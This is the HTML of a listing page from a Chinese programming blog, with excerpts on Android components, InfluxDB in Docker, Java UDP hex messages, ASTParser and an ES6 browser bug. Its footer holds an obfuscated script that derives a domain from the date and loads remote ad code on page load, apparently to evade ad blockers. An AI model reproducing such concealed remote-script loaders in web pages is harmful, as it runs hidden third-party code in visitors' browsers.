Android的基本组件 1.1 Activity 1.1.1 Activity代表手机的一个屏幕 1.1.2 一个Android程序由多个Activity组成，即：一个Android程序由多屏内容组成 1.1.3 Activity相当于一个展板，本身没有可视的内容，你把画(View)贴到展板上就可以展示出来了 1.2 Service 1.2.1 不可见的组件 1.2.2 在后台运行 1.2.3 为其他组件提供后台服务 1.2.4 监控其他组件的运行状态 1.2.5 后台播放音乐 1.3 BroadcastReceiver：广播消息监听器 1.3.1 作用：用来监听广播，eg:收短信的广播 往手机推送消息 1.4 ContentProvider：内容提供者 1.4.1 帮助不同的应用程序间交换数据，eg：获取通讯录信息 1.5 Intent和IntentFilter 意图 Activity、Service、BroadcastReceiver之间通信的载体，传递数据
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e3117ff14b795ed6cb3e4654f7020af1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4b20025e48491b4fa1830768dc542b03/" rel="bookmark">
			InfluxDB -docker 安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 搜索资源 docker search inflxudb 2.拉取资源 docker pull influxdb [不加版本号 则默认拉取最新的]
3.查看镜像 docker images [root@localhost ~]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE hello-world latest 4ab4c602aa5e 6 days ago 1.84kB influxdb latest dff45714308e 8 days ago 213MB mysql 5.6 1f47fade220d 9 days ago 256MB mysql latest 6a834f03bd02 9 days ago 484MB 启动：
#docker run -d -p 8083:8083 -p8086:8086 --expose 8090 --expose 8099 --name influxDbService influxdb -d：容器在后台运行 -p：将容器内端口映射到宿主机端口，格式为 宿主机端口:容器内端口；8083是influxdb的web管理工具端口，8086是influxdb的HTTP API端口 --expose：可以让容器接受外部传入的数据 --name：容器名称 此处influxDbService 则是启动后的容器名 最后是镜像名称influxdb，镜像名可以通过docker images 查看； 通过tag 区分启镜像版本。 如把版本为 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4b20025e48491b4fa1830768dc542b03/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa4837a44346638e51d8acfa44d6e3ae/" rel="bookmark">
			java实现udp接收16进制报文通信（注释齐全，简单明了）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天，废话不多说，直接上代码，保存起来，方便自己和同道中人参考
由于udp通信的不可靠性，经常丢包，所以大家以后用到的话，发送报文时，记得发三遍，三遍丢包情况就基本不会发生。
现在先上通信的接收代码
//定义一个端口号 int port = 10086; try { //创建接收方的套接字,监听端口号 DatagramSocket getSocket = new DatagramSocket(port); while(true){ //确定接收的数据报文的长度，来建立缓冲区 byte[] buf = new byte[36]; //创建接收类型的数据包，数据先储存在缓冲区 DatagramPacket getPacket = new DatagramPacket(buf,buf.length); //通过套接字接收数据 getSocket.receive(getPacket); //解析接收到到16机制数据 byte[] bytes = getPacket.getData(); String data = getBufHexStr(bytes); LOG.info("data:"+data);//接收成功后回复 backHeadle(getSocket,getPacket); } } catch (SocketException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); } 将16进制的byte数组转换成字符串getBufHexStr方法的代码段： //将16进制的byte数组转换成字符串 public static String getBufHexStr(byte[] raw){ String HEXES = "0123456789ABCDEF"; if ( raw == null ) { return null; } final StringBuilder hex = new StringBuilder( 2 * raw.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aa4837a44346638e51d8acfa44d6e3ae/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/40df1ccb8ef2ed151c48a2c6e6b219bf/" rel="bookmark">
			使用ASTParser(抽象语法树)获取类属性注释
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 项目中有一个小任务,就是将项目中涵盖有哪些字段列举出来.思来想去,想到了AST可以读取到属性的注释,就免去了把字段获取后还需要填写中文名称的麻烦.
引入包
&lt;!-- https://mvnrepository.com/artifact/de.defmacro/eclipse-astparser --&gt;
&lt;dependency&gt;
&lt;groupId&gt;de.defmacro&lt;/groupId&gt;
&lt;artifactId&gt;eclipse-astparser&lt;/artifactId&gt;
&lt;version&gt;8.1&lt;/version&gt;
&lt;/dependency&gt;
大体思路如下:
ASTParser astParser = ASTParser.newParser(AST.JLS3); BufferedInputStream bufferedInputStream = new BufferedInputStream(new FileInputStream(文件路径)); byte[] input = new byte[bufferedInputStream.available()]; bufferedInputStream.read(input); bufferedInputStream.close(); astParser.setKind(ASTParser.K_COMPILATION_UNIT); astParser.setSource(new String(input).toCharArray()); CompilationUnit result = (CompilationUnit) (astParser.createAST(null)); TypeDeclaration type = (TypeDeclaration) result.types().get(0); FieldDeclaration[] f = type.getFields(); for (int j = 0; j &lt; f.length; j++) { try { f[j].getJavadoc().toString()//获取每一个属性的注释 f[j].fragments().get(0).toString()//获取属性字段 //还需要获取属性字段名称. } catch (Exception e) { } } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e8b613a6cee23b7c4dbac92f1bb2c147/" rel="bookmark">
			微信电脑版自带浏览器无法识别es6的includes语法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近在工作中遇到了一个bug，就是vue项目在微信电脑版自带浏览器里数据不显示，经过debug发现是es6的includes语法无法识别，最后改成indexOf就可以了....
真的是很奇葩了，谁会在微信电脑版自带浏览器打开移动端的网页看啊....
不过也算是收获了一点东西....
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/500/">«</a>
	<span class="pagination__item pagination__item--current">501/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/502/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>